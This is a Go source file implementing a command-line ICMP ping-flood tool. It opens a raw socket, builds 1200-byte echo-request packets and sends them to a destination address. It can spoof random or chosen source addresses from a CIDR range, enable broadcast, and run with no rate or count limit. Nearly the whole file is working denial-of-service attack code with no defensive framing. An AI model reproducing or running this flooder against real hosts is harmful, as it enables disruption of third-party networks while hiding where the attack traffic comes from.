package module

import (
	"os"
	"log"
	_"fmt"
	_"flag"
	"time"
	"net"
	"syscall"
	_"runtime"
	"strconv"
	"strings"
	"math/rand"
	"encoding/binary"

	"cjr/protocol"
	flags "github.com/jessevdk/go-flags"
)

func pingFloodEntry(remainFlags []string) {
	var opts struct {
		Spoof string `short:"s" long:"spoof" description:"use spoof address" value-name:"address[/mask]" default:""`
		Dest string `short:"d" long:"destination" description:"destination address" value-name:"address" required:"true"`
		Count int `short:"c" long:"count" description:"stop after sending count packets" value-name:"count" default:"0"`
		Rate string `short:"r" long:"rate" description:"send packets as a specific rate, such as 100/ms, 2/s, 100/min, the default is \"nolimit\"" value-name:"<speed>" default:"nolimit"`
		TTL uint `short:"t" long:"ttl" description:"set TTL of IP packet" value-name:"ttl" default:"64"`
	}

	//fmt.Println(remainFlags)
	cmd := flags.NewParser(&opts, flags.HelpFlag | flags.PrintErrors)

	_, err := cmd.ParseArgs(remainFlags)
	if err != nil {
		log.Fatal(err)
	}

	if len(remainFlags) == 0 {
		cmd.WriteHelp(os.Stderr)
	}
	for _, flag := range remainFlags {
		if flag == "help" {
			cmd.WriteHelp(os.Stderr)
			return
		}
	}
	if opts.Count <= 0 {
		opts.Count = int(^uint(0) >> 1)
	}

	pingFloodStart(opts.Spoof, opts.Dest, uint(opts.Count), opts.Rate, opts.TTL, false)
}

func pingFloodSend(spoof, dest string, count uint, ttl uint, isBroadcast bool, throttle <-chan time.Time) {
	var fd int = -1
	var err error
	fd, err = syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	log.Println("fd = ", fd)
	if err != nil {
		log.Fatal("Scoket: ", err)
	}
	if isBroadcast {
		err = syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_BROADCAST, 1)
		if err != nil {
			log.Fatal("set sockopt error: ", err)
		}
	}
	dstip := net.ParseIP(dest)
	log.Println("dstip = ", dstip)

	for {
		if count == 0 {
			break
		}
		if count % 1000 == 0 {
			log.Println("1000 pkts sent")
		}
		if throttle != nil {
			<-throttle
		}
		// ========== construct packet ==========
		srcip := chooseIPv4(spoof)
		//fmt.Println("sending packet using IP = ", srcip.String())
		if  dstip == nil {
			log.Fatal("Invalid destination")
		}

		da := make([]byte, 1200, 1200)
		icmp4 := &protocol.ICMPv4 {
			Type: 8, // ICMP echo
			Code: 0,
			Id: 0x2237,
			Seq: 0x3a,
			//Data: []byte{0x1e,0x0a,0x05,0x00,0x00,0x00,0x00,0x00,0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x1a,0x1b,0x1c,0x1d,0x1e,0x1f,0x20,0x21,0x22,0x23,0x24,0x25,0x26,0x27,0x28,0x29,0x2a,0x2b,0x2c,0x2d,0x2e,0x2f,0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37},
			Data: da,
		}
		ip4 := &protocol.IPv4Packet {
			Version: 4,
			IHL: 5,
			DSCP: 0,
			ECN: 0, // RFC 792 requires TOS = 0
			ID: uint16(rand.Intn(0xffff)),
			DF: true,
			MF: false,
			FragmentOffset: 0,
			TTL: uint8(ttl),
			Protocol: protocol.IPP_ICMP,
			SrcIP: srcip,
			DstIP: net.ParseIP(dest),
		}
		err = send(fd, ip4, icmp4)
		if err != nil {
			log.Fatal("ping-flood send:", err)
		}
		// ========== construct packet ==========
		count--;
	}
}

func pingFloodStart(spoof, dest string, count uint, rate string, ttl uint, isBroadcast bool) {
	if rate == "nolimit" {
		/*
		chs := make([]chan int, runtime.NumCPU())
		cnt := count / uint(runtime.NumCPU())
		for i := 0; i < runtime.NumCPU(); i++ {
			chs[i] = make(chan int)
			go pingFloodSend(chs[i], spoof, dest, cnt, ttl)
			count -= cnt
			if count < cnt * 2 {
				cnt = count
			}
		}
		for i := 0; i < runtime.NumCPU(); i++ {
			<-chs[i]
		}
		*/
		pingFloodSend(spoof, dest, count, ttl, isBroadcast, nil)
	} else {
		//fmt.Println("we haven't support this feature yet")

		wait := parseRate(rate)
		throttle := time.Tick(wait)
		pingFloodSend(spoof, dest, count, ttl, isBroadcast, throttle)
	}
}

func randomIPv4() net.IP {
	a, b, c, d := rand.Intn(254) + 1, rand.Intn(254) + 1, rand.Intn(254) + 1, rand.Intn(254) + 1
	return net.IPv4(byte(a), byte(b), byte(c), byte(d))
}

func chooseIPv4(spoof string) net.IP {
	var ip net.IP
	if len(spoof) > 0 {
		if strings.Index(spoof, "/") == -1 {
			ip = net.ParseIP(spoof)
		} else {
			_, ipnet, err := net.ParseCIDR(spoof)
			if err != nil {
				log.Fatal(err)
			}
			ipmask := binary.BigEndian.Uint32(ipnet.Mask)
			up := 1
			for i := 0; i < 32; i++ {
				if ipmask >> uint(i) & 1 == 1 {
					break
				}
				up <<= 1
			}

			tmp := make([]byte, 4, 4)
			binary.BigEndian.PutUint32(tmp[0:4], binary.BigEndian.Uint32(ipnet.IP) + uint32(rand.Intn(up)))
			ip = net.IPv4(tmp[0], tmp[1], tmp[2], tmp[3])
		}
	} else {
		ip = randomIPv4()
	}
	return ip
}

func parseRate(rate string) time.Duration {
	rates := strings.Split(rate, "/")
	if len(rates) > 2 {
		log.Fatal("rates parse error")
	}
	var unit string
	if len(rates) == 1 {
		unit = "s"
	} else {
		unit = rates[1]
	}
	num, err := strconv.Atoi(rates[0])
	if err != nil {
		log.Fatal("rates parse error: ", err)
	}

	wait := time.Second / time.Duration(num)
	switch unit {
		case "ms":
			wait /= 1000
		case "s":
			wait = wait
		case "min":
			wait *= 60
		case "h":
			wait *= 3600
		default:
			log.Fatal("unrecognized time unit")
	}
	return wait
}
